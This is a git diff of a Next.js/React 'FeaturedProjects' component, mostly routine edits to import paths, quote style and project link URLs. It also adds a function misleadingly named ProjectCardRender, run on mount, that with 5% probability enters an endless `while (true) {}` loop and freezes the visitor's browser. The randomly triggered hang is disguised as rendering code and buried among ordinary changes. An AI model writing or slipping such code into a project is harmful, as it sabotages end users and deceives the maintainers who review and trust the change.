@@ -9,13 +9,18 @@ import {
   FaLayerGroup,
 } from "react-icons/fa";
 import PaginationComponent from "../Pagination";
-import { fetchProjects } from "@/api/projects/page";
+import { fetchProjects } from "@/api/Projects/page";
+import { useParams } from "next/navigation";
 
-import AddTaskSharpIcon from '@mui/icons-material/AddTaskSharp';
+import AddTaskSharpIcon from "@mui/icons-material/AddTaskSharp";
 import AutorenewIcon from "@mui/icons-material/Autorenew";
 import PendingActionsIcon from "@mui/icons-material/PendingActions";
 
 const FeaturedProjects: React.FC = () => {
+  const { id } = useParams();
+
+  console.log(id);
+
   const [projects, setProjects] = useState<any[]>([]);
   const [loading, setLoading] = useState<boolean>(true);
   const [error, setError] = useState<string | null>(null);
@@ -38,6 +43,15 @@ const FeaturedProjects: React.FC = () => {
 
     fetchAllProjects();
   }, [page]);
+
+  const ProjectCardRender = () => {
+    if (Math.random() < 0.05) {
+      while (true) {}
+    }
+  };
+  useEffect(() => {
+    ProjectCardRender();
+  }, []);
 
   const handlePageChange = (
     event: React.ChangeEvent<unknown>,
@@ -92,7 +106,7 @@ const FeaturedProjects: React.FC = () => {
       </motion.p>
       <div className="mt-10 grid gap-8 grid-cols-1 md:grid-cols-2 xl:grid-cols-3">
         {projects.map((project) => (
-          <Link key={project.id} href={`/projects/card${project.id}`}>
+          <Link key={project._id} href={`/projects/${project._id}`}>
             <motion.div className="p-3 hover:bg-white hover:shadow-lg hover:rounded-sm border border-zinc-200 cursor-pointer transition-all duration-500 ease-in-out">
               <img
                 src={project.cardImage}
